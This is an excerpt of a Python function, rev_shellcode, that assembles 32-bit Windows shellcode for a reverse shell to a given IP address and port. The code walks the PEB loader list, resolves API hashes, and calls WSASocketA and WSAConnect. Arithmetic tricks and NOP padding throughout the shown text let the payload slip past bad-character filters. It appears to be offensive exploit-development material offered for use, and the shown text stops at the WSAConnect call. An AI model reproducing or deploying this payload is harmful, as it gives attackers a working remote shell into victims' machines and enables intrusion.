...
def rev_shellcode(rev_ip_addr, rev_port, badchars=b""):
    ...
    asm = [
        ...
        "    push ecx                        ;",  # -------------------------bypass badchar starts here
        "    mov ecx, esi                    ;",
        "    add ecx, 0x88888888             ;",
        "    add ecx, 0x77777784             ;",  # ecx = esi + 0c   bypass badchar
        "    mov esi,[ecx]                   ;",  # ESI = PEB->Ldr
        "    pop ecx                         ;",  # -------------------------bypass badchar ends here
        ...
        "    mov ecx, esi                    ;",
        "    add ecx, 0x88888888             ;",
        "    add ecx, 0x77777798             ;",  # ecx = esi + 0x20   bypass badchar
        "    mov edi, [ecx]                  ;",  # EDI = InInitOrder[X].module_name
        "    pop ecx                         ;",  # -------------------------bypass badchar ends here
        ...
        "    mov ecx, edi                    ;",
        "    add ecx, 0x88888888             ;",
        "    add ecx, 0x77777798             ;",  # ecx = edi + 0x20   bypass badchar        
        "    mov eax, [ecx]                  ;",  # AddressOfNames RVA
        "    pop ecx                         ;",  # -------------------------bypass badchar ends here
        ...
        "    ror edx, 0x07                   ;",  # Rotate edx 13 bits to the right
        "    ror edx, 0x06                   ;",  # Rotate edx 13 bits to the right
        "    add edx, eax                    ;",  # Add the new byte to the accumulator
        "    nop                             ;",  # for bypass badchar
        "    nop                             ;",  # for bypass badchar
        "    nop                             ;",  # for bypass badchar
        "    nop                             ;",  # for bypass badchar
        ...
        "    push eax                        ;",  # -------------------------bypass badchar starts here
        "    mov eax, edx                    ;",
        "    add eax, ecx                    ;",
        "    add eax, ecx                    ;",  # eax = edx + 2*ecx      
        "    mov cx, [eax]                   ;",  # Extrapolate the function's ordinal
        "    pop eax                         ;",  # -------------------------bypass badchar ends here
        ...
        "    mov eax, 0xadf519d8             ;",  # WSASocketA hash  push 0xadf509d9 ***bypass badchar
        "    add eax, 0xFFFFF001             ;",  # WSASocketA hash  push 0xadf509d9 ***bypass badchar
        "    push eax                        ;",  # WSASocketA hash  push 0xadf509d9 ***bypass badchar
        "    call dword ptr [ebp+0x04]       ;",  # Call find_function
        "    push ecx                        ;",  # -------------------------bypass badchar starts here
        "    mov ecx, ebp                    ;",
        "    add ecx, 0x88888888             ;",
        "    add ecx, 0x77777798             ;",  # ecx = ebp + 0x20 bypass badchar
        "    mov [ecx], eax                  ;",  # Save WSASocketA address for later usage
        "    pop ecx                         ;",  # -------------------------bypass badchar ends here
        "    mov eax, 0xb32dba2c             ;",  # WSAConnect hash push 0xb32dba0c   bypass badchar
        "    add eax, 0xFFFFFFE0             ;",  # WSAConnect hash push 0xb32dba0c   bypass badchar
        "    push eax                        ;",  # WSAConnect hash push 0xb32dba0c   bypass badchar
        "    call dword ptr [ebp+0x04]       ;",  # Call find_function
        ...
        "    push eax                        ;",  # Push af
        "    mov eax, ebp                    ;",
        "    sub eax, 0xffffffe0             ;",  # eax = ebp+0x20  bypass bad char       
        "    call dword ptr [eax]            ;",  # Call WSASocketA
        "call_wsaconnect:                     ",
